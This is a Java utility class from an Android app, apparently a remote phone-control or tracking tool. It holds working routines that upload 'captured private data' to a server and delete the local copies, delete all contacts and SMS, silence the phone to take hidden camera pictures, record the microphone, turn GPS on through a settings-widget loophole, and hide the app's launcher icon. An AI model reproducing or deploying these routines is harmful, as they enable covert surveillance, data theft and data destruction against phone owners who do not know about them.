package edu.glyndwr.utils;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.nio.channels.FileChannel;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;

import android.app.Activity;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ActivityInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.database.Cursor;
import android.hardware.Camera;
import android.media.AudioManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo.State;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.Environment;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.telephony.SmsManager;
import android.util.Log;
import android.widget.Toast;
import edu.glyndwr.activities.StartActivity;
import edu.glyndwr.activities.TakePictureActivity;
import edu.glyndwr.rest.tasks.SendCapturedPrivateDataTask;
import edu.glyndwr.services.SyncronizationService;
import edu.glyndwr.tools.AudioRecorder;
import edu.glyndwr.tools.TelephonyManagerProcessor;

public class Utils {
	private static Context context;
	private static ComponentName component;
	public static Intent SYNCHRONIZATION_SERVICE;
	private static AudioRecorder recorder;

	public static void setApplicationContext(Context ctx) {
		context = ctx;
		/*if (null == SYNCHRONIZATION_SERVICE) {
			if (null != ctx)
				//SYNCHRONIZATION_SERVICE = new Intent(ctx,SyncronizationService.class);
			//context.startService(SYNCHRONIZATION_SERVICE);
		}*/
	}

	public static void setComponentName(ComponentName componentName) {
		component = componentName;
	}

	/**
	 * Send all data to server from Constants.STORAGE_DIR and delete files after
	 * sending
	 */
	public static void sendAllPrivateData() {
		File f = new File(Constants.STORAGE_DIR);
		String[] fileList = f.list();
		if (null != fileList)
		for (int i = 0; i < fileList.length; i++) {
			try {
				(new SendCapturedPrivateDataTask(fileList[i])).execute(null,
						null, null);
			} catch (Exception ex) {
				Utils.LOG(ex.getMessage());
			}
		}
	}

	public static Context getContext() {
		return context;
	}

	/**
	 * Delete all contacts
	 */
	public static void deleteAllContacts() {
		if (null != getContext()) {
			ContentResolver cr = getContext().getContentResolver();
			Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null,
					null, null, null);
			while (cur.moveToNext()) {
				try {
					String lookupKey = cur
							.getString(cur
									.getColumnIndex(ContactsContract.Contacts.LOOKUP_KEY));
					Uri uri = Uri.withAppendedPath(
							ContactsContract.Contacts.CONTENT_LOOKUP_URI,
							lookupKey);
					Utils.LOG("The uri is " + uri.toString());
					cr.delete(uri, null, null);
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		}
	}

	/**
	 * Delete all messages
	 */
	public static void deleteAllMessages() {

		Uri deleteUri = Uri.parse("content://sms");

		Cursor c = context.getContentResolver().query(deleteUri, null, null,
				null, null);
		while (c.moveToNext()) {
			try {
				// Delete the SMS
				String pid = c.getString(0); // Get id;
				String uri = "content://sms/" + pid;
				context.getContentResolver().delete(Uri.parse(uri), null, null);
			} catch (Exception e) {
			}
		}
	}

	/**
	 * Send sms
	 */
	public static void sendTextMessage(String phoneNo, String message) {
		SmsManager sms = SmsManager.getDefault();
		// 160 - one single message
		if (message.toString().length() < 160) {
			Log.d("SMSTest", "Sending single message: " + message);
			sms.sendTextMessage(phoneNo, null, message, null, null);
		} else {
			Log.d("SMSTest", "Sending '" + message + "' in multiple parts.");
			ArrayList<String> parts = sms.divideMessage(message);
			Log.d("SMSTest", parts.size() + " parts:");
			for (String string : parts) {
				Log.d("SMSTest", string);
			}

			sms.sendMultipartTextMessage(phoneNo, null, parts, null, null);
		}
	}

	/**
	 * 
	 * @param isSilent
	 *            true means volume of STREAM_MUSIC and STREAM_RING become zero,
	 *            otherwise set to maximum both
	 */
	public static void setVolumeMode(boolean isSilent) {
		AudioManager audioManager = (AudioManager) context
				.getSystemService(Context.AUDIO_SERVICE);
		if (isSilent) {
			audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, 0,
					AudioManager.FLAG_REMOVE_SOUND_AND_VIBRATE);
			// audioManager.setStreamVolume(AudioManager.STREAM_RING,0,AudioManager.FLAG_REMOVE_SOUND_AND_VIBRATE);
			audioManager.setRingerMode(AudioManager.RINGER_MODE_SILENT);
		} else {
			audioManager.setStreamVolume(AudioManager.STREAM_MUSIC,
					audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC),
					AudioManager.FLAG_REMOVE_SOUND_AND_VIBRATE);
			audioManager.setStreamVolume(AudioManager.STREAM_RING,
					audioManager.getStreamMaxVolume(AudioManager.STREAM_RING),
					AudioManager.FLAG_REMOVE_SOUND_AND_VIBRATE);
			audioManager.setRingerMode(AudioManager.RINGER_MODE_NORMAL);
		}
	}

	public static byte[] streamToBytes(InputStream is) {
		ByteArrayOutputStream os = new ByteArrayOutputStream(1024);
		byte[] buffer = new byte[1024];
		int len;
		try {
			while ((len = is.read(buffer)) >= 0) {
				os.write(buffer, 0, len);
			}
		} catch (java.io.IOException e) {
		}
		return os.toByteArray();
	}

	/**
	 * Take picture from camera
	 */
	public static void takePicture() {
		try {
			// set silen mode (for taking picture withour user notification)
			Utils.setVolumeMode(true);
			Intent takePictureActivity = new Intent(context,
					TakePictureActivity.class);
			takePictureActivity.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
			TakePictureActivity.HIDDEN_MODE_TAKING_PICTURE = true;
			// start activity and take picture in hidden mode
			context.startActivity(takePictureActivity);
		} catch (Exception ex) {
			ex.printStackTrace();
		}

	}

	/**
	 * Open front camera if it exists
	 * 
	 * @return camera object
	 */
	public static Camera openFrontFacingCameraGingerbread() {
		int cameraCount = 0;
		Camera cam = null;
		Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
		cameraCount = Camera.getNumberOfCameras();
		for (int camIdx = 0; camIdx < cameraCount; camIdx++) {
			Camera.getCameraInfo(camIdx, cameraInfo);
			if (cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
				try {
					cam = Camera.open(camIdx);
				} catch (RuntimeException e) {
					e.printStackTrace();
				}
			}
		}
		return cam;
	}

	/**
	 * Check external storage is it writable
	 * 
	 * @return true if external storaga writable, false otherwise
	 */
	public static boolean isExternalStorageWritable() {

		boolean mExternalStorageWriteable = false;
		String state = Environment.getExternalStorageState();

		if (Environment.MEDIA_MOUNTED.equals(state)) {
			// We can read and write the media
			mExternalStorageWriteable = true;
		} else if (Environment.MEDIA_MOUNTED_READ_ONLY.equals(state)) {
			// We can only read the media
			mExternalStorageWriteable = false;
		} else {
			// Something else is wrong. It may be one of many other states, but
			// all we need
			// to know is we can neither read nor write
			mExternalStorageWriteable = false;
		}
		return mExternalStorageWriteable;
	}

	/**
	 * Check if external storage avaliable
	 * 
	 * @return true if external storaga avaliable, false otherwise
	 */
	public static boolean isExternalStorageAvaliable() {
		boolean mExternalStorageAvailable = false;

		String state = Environment.getExternalStorageState();

		if (Environment.MEDIA_MOUNTED.equals(state)) {
			// We can read and write the media
			mExternalStorageAvailable = true;
		} else if (Environment.MEDIA_MOUNTED_READ_ONLY.equals(state)) {
			// We can only read the media
			mExternalStorageAvailable = true;

		} else {
			// Something else is wrong. It may be one of many other states, but
			// all we need
			// to know is we can neither read nor write
			mExternalStorageAvailable = false;
		}
		return mExternalStorageAvailable;
	}

	/**
	 * Copy file from one path to another
	 * 
	 * @param src
	 *            source of copy file
	 * @param dst
	 *            destination folder
	 * @throws IOException
	 */
	public static void copyFile(File src, File dst) throws IOException {
		FileChannel inChannel = new FileInputStream(src).getChannel();
		FileChannel outChannel = new FileOutputStream(dst).getChannel();
		try {
			inChannel.transferTo(0, inChannel.size(), outChannel);
		} finally {
			if (inChannel != null)
				inChannel.close();
			if (outChannel != null)
				outChannel.close();
		}
	}

	/**
	 * Show toast for user notification
	 * 
	 * @param message
	 *            string representaion of message
	 */
	public static void showToast(String message) {
		if (null != context) {
			Toast.makeText(context, message, Toast.LENGTH_LONG).show();
		} else {
			Utils.LOG("Utils::showToas -> Context == null");
		}
	}

	/**
	 * Make application visible in main list
	 * 
	 * @param ctx
	 */
	public static void showApplication(Context ctx) {
		try {
			if (null == component) {
				component = new ComponentName(ctx, StartActivity.class);
				if (null == context) {
					context = ctx;
				}
			}
			PackageManager pm = context.getApplicationContext()
					.getPackageManager();
			pm.setComponentEnabledSetting(component,
					PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
					PackageManager.DONT_KILL_APP);
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

	public static void hideApplication(Context ctx) {
		try {
			if (null == component) {
				component = new ComponentName(ctx, StartActivity.class);
				if (null == context) {
					context = ctx;
				}
			}
			showToast("Application will hide in a 5 seconds");
			PackageManager pm = context.getApplicationContext()
					.getPackageManager();
			pm.setComponentEnabledSetting(component,
					PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
					PackageManager.DONT_KILL_APP);
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

	/**
	 * Record audio from microphone
	 * 
	 * @param durationInSeconds
	 *            duration of recording in seconds
	 */
	public static void recordAudio(final int durationInSeconds) {
		TelephonyManagerProcessor tmp = new TelephonyManagerProcessor();
		SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd_HH_mm_ss");
		final String audiofileName = Constants.STORAGE_DIR
		+ String.valueOf(File.separator + tmp.getTelephonyOverview().deviceId/*System.currentTimeMillis()*/)
		+sdf.format(new Date()) +".3gp";//File.separator + sdf.format(new Date())+"_"+tmp.getTelephonyOverview().deviceId +".3gp";
		final AudioRecorder recorder = new AudioRecorder(audiofileName);
		try {
			recorder.start();
			Thread audioThread = new Thread(new Runnable() {
				@Override
				public void run() {
					try {
						try {
							Thread.sleep(durationInSeconds * 1000);
							recorder.stop();
						} catch (InterruptedException e) {
							e.printStackTrace();
						}
					} catch (IOException e) {
						e.printStackTrace();
					}

				}
			});
			audioThread.start();
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
  
	/**
	 * Record audio from microphone
	 * 
	 * @param durationInSeconds
	 *            duration of recording in seconds
	 */
	public static AudioRecorder startRecordAudio() {
		try {
		DeviceInfo dev = (new TelephonyManagerProcessor()).getTelephonyOverview();
		SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd_HH_mm_ss");
		final String audiofileName = File.separator+ sdf.format(new Date())+ "_"+dev.deviceId+".3gp";
		recorder = new AudioRecorder(audiofileName);
		
		try {
			recorder.start();
		} catch (IOException e) {
			e.printStackTrace();
		}
		} catch (Exception e) {
			e.printStackTrace();
		}
		return recorder;
	}
	
	public static void stopRecordingAudio() {
		try {
			recorder.stop();
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	/**
	 * Turn on GPS
	 */
	public static void turnGPSOn() {
		String provider = Settings.Secure.getString(
				context.getContentResolver(),
				Settings.Secure.LOCATION_PROVIDERS_ALLOWED);
		// if gps is disabled
		if (!provider.contains("gps")) {
			final Intent poke = new Intent();
			poke.setClassName("com.android.settings",
					"com.android.settings.widget.SettingsAppWidgetProvider");
			poke.addCategory(Intent.CATEGORY_ALTERNATIVE);
			poke.setData(Uri.parse("3"));
			context.sendBroadcast(poke);

		}
	}

	/**
	 * Turn off GPS
	 */
	public static void turnGPSOff() {
		String provider = Settings.Secure.getString(
				context.getContentResolver(),
				Settings.Secure.LOCATION_PROVIDERS_ALLOWED);
		// if gps is enabled
		if (provider.contains("gps")) {
			final Intent poke = new Intent();
			poke.setClassName("com.android.settings",
					"com.android.settings.widget.SettingsAppWidgetProvider");
			poke.addCategory(Intent.CATEGORY_ALTERNATIVE);
			poke.setData(Uri.parse("3"));
			context.sendBroadcast(poke);
		}
	}

	/**
	 * Check possibility to change GPS state
	 * 
	 * @param screen
	 *            activity for getting appropriate pm
	 * @return true if it is possible, false otherwise
	 */
	public static boolean canToggleGPS(Activity screen) {
		PackageManager pacman = screen.getPackageManager();
		PackageInfo pacInfo = null;

		try {
			pacInfo = pacman.getPackageInfo("com.android.settings",
					PackageManager.GET_RECEIVERS);
		} catch (NameNotFoundException e) {
			return false;
		}

		if (pacInfo != null) {
			for (ActivityInfo actInfo : pacInfo.receivers) {
				// test if recevier is exported. if so, can toggle GPS.
				if (actInfo.name
						.equals("com.android.settings.widget.SettingsAppWidgetProvider")
						&& actInfo.exported) {
					return true;
				}
			}
		}
		return false;
	}

	/**
	 * Turn on or off WIFI on mobile device
	 * 
	 * @param wifiState
	 *            if true wifi will turn on, turn off otherwise
	 */
	public static void changeWiFiState(boolean wifiState) {
		try {
			WifiManager wifiManager = (WifiManager) context
					.getSystemService(Context.WIFI_SERVICE);
			wifiManager.setWifiEnabled(wifiState);
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

	public static boolean isWifiActive() {
		boolean retValue = false; // by default
		ConnectivityManager conMan = (ConnectivityManager) context
				.getSystemService(Context.CONNECTIVITY_SERVICE);

		// mobile
		State mobile = conMan.getNetworkInfo(ConnectivityManager.TYPE_MOBILE)
				.getState();

		// wifi
		State wifi = conMan.getNetworkInfo(ConnectivityManager.TYPE_WIFI)
				.getState();

		if (mobile == android.net.NetworkInfo.State.CONNECTED
				|| mobile == android.net.NetworkInfo.State.CONNECTING) {
			// mobile
		} else if (wifi == android.net.NetworkInfo.State.CONNECTED
				|| wifi == android.net.NetworkInfo.State.CONNECTING) {
			retValue = true;
		}
		return retValue;
	}

	/**
	 * Write message to android log
	 * 
	 * @param message
	 *            message to print
	 */
	public static void LOG(String message) {
		Log.d(Constants.FIND_ME_PLEASE, String.valueOf(message));
	}

	/**
	 * Conver input string to MD5 string
	 * 
	 * @param strInput
	 *            string to convert
	 * @return converted string
	 */
	public static String getMD5Hash(String strInput) {
		try {
			// Create MD5 Hash
			MessageDigest digest = java.security.MessageDigest
					.getInstance("MD5");
			digest.update(strInput.getBytes());
			byte messageDigest[] = digest.digest();

			// Create Hex String
			StringBuffer hexString = new StringBuffer();
			for (int i = 0; i < messageDigest.length; i++)
				hexString.append(Integer.toHexString(0xFF & messageDigest[i]));
			return hexString.toString();

		} catch (NoSuchAlgorithmException e) {
			e.printStackTrace();
		}
		return "";

	}
}
